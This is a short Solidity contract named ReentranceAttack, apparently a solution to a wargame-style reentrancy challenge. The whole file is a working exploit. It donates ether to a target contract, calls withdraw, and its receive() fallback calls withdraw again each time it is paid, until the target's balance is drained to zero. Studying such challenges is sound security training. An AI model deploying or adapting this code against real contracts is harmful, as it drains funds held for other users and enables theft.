// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IReentrance.sol";

contract ReentranceAttack {
    IReentrance private immutable target;

    constructor(IReentrance target_) {
        target = target_;
    }

    function attack() external payable {
        require(0 < msg.value && msg.value <= address(target).balance, "Reentrance: Wrong value");

        target.donate{ value: msg.value }(address(this));

        require(0 < target.balanceOf(address(this)), "Reentrance: Wrong balance");

        target.withdraw(msg.value);

        require(0 == address(target).balance, "Reentrance: Attack failed");
    }

    receive() external payable {
        target.withdraw(msg.value);
    }
}
